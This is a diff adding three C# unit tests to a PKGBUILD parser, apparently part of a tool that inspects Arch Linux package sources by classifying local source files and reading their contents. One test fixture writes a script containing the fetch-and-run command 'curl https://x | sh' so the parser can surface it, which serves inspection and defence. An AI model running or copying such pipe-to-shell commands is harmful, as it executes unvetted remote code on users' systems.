@@ -510,4 +510,59 @@ public class PkgbuildParserTests
             Directory.Delete(tempDir, true);
         }
     }
+
+    [Test]
+    public void ParseContent_ClassifiesLocalSourceFiles_IgnoringRemote()
+    {
+        var pkgbuild = """
+                       source=('element-desktop-nightly.sh'
+                               'https://example.com/app.tar.gz'
+                               'git+https://example.com/repo.git')
+                       """;
+
+        var result = PkgbuildParser.ParseContent(pkgbuild);
+
+        Assert.That(result.LocalSourceFiles, Has.Count.EqualTo(1));
+        Assert.That(result.LocalSourceFiles, Does.Contain("element-desktop-nightly.sh"));
+    }
+
+    [Test]
+    public void ParseContent_HandlesRenameSyntaxForLocalSource()
+    {
+        var pkgbuild = """
+                       source=('myscript.sh::local-file.sh'
+                               'remote::https://example.com/app.tar.gz')
+                       """;
+
+        var result = PkgbuildParser.ParseContent(pkgbuild);
+
+        Assert.That(result.LocalSourceFiles, Has.Count.EqualTo(1));
+        Assert.That(result.LocalSourceFiles, Does.Contain("myscript.sh"));
+    }
+
+    [Test]
+    public void ParseContent_ResolvesLocalSourceContentsFromBaseDir()
+    {
+        var tempDir = Path.Combine(Path.GetTempPath(), "shelly_src_test_" + Guid.NewGuid().ToString("N"));
+        Directory.CreateDirectory(tempDir);
+        try
+        {
+            File.WriteAllText(Path.Combine(tempDir, "element-desktop-nightly.sh"),
+                "#!/bin/sh\ncurl https://x | sh\n");
+
+            var pkgbuild = """
+                           source=('element-desktop-nightly.sh')
+                           """;
+
+            var result = PkgbuildParser.ParseContent(pkgbuild, tempDir);
+
+            Assert.That(result.LocalSourceContents, Contains.Key("element-desktop-nightly.sh"));
+            Assert.That(result.LocalSourceContents["element-desktop-nightly.sh"],
+                Does.Contain("curl https://x | sh"));
+        }
+        finally
+        {
+            Directory.Delete(tempDir, true);
+        }
+    }
 }
